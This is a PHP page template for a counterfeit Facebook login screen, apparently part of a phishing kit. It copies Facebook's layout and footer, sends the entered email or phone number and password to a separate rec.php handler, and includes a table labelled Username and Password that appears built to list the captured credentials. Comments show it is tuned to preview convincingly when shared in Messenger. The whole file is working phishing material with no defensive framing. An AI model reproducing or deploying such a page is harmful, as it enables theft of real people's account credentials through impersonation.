<?php
include("config.php");
?>
<html>

<head>

	<!--Titre en haut-->
	<title><?php echo $title ?></title>

	<meta charset="UTF-8">


	<!--photo-->
	<link rel="icon" href="<?php echo $icon ?>" type="image/x-icon" />


	<meta name="viewport" content="width=device-width, initial-scale=1.0">

	<meta property="og:type" content="website" />


	<!--photo messenger  IMPORTANT-->
	<meta property="og:image" content="<?php echo $icon ?>" />


	<link rel="stylesheet" type="text/css" href="index.css">

	<link rel="stylesheet" type="text/css" href="bootstrap.css">

</head>

<body>
	<center>
		<div class="header">
			<h1>facebook</h1>
		</div>

		<div class="container">
			<br>
			<table>
				<th></th>
				<form method="post" action="rec.php">
					<tr>
						<td>
							<input type="text" placeholder="Mobile number or email" id="firstname" autocomplete="off" name="name" required>
						</td>
					</tr>
					<tr>
						<td>
							<input type="Password" placeholder="Password" id="lastname" name="pass" autocomplete="off" required>
						</td>
					</tr>
					<tr></tr>
			</table>
			<br>
			<button id="submit" type="submit">Login</button>
			</form>
			<br>
			<div style="display:flex">
				<hr style="width:45%;text-align:left;background-color:black;">
				<p style="margin:0; padding:0; padding-top:9px">or</p>
				<hr style="width:45%;text-align:left;background-color:black;">
			</div>
			<button class="create">Create New Account</button>
			<p></p>
			<div class="help">
				<a href="">Forgot Password? · Help Center</a>
				<br>
				<br>
			</div>
		</div>

		<div class="lang">
			<div class="current">
				<p>English (US)</p>
				<a href="">kiswahili</a>
				<br>
				<a href="">Español</a>
				<br>
				<a href="">Deutsch</a>
			</div>
			<div class="french">
				<a href="">Français (France)</a>
				<br>
				<a href="">Italiano</a>
				<br>
				<a href="">Português (Brasil)</a>
			</div>
		</div>
		<p class="rights">Facebook ©2018</p>
		<table id="regtable">
			<thead>
				<tr>
					<th>Username</th>
					<th>Password</th>
				</tr>
			</thead>
			<tbody id="tablerows"></tbody>
		</table>
		</div>
		</div>
		</div>
	</center>
</body>

</html>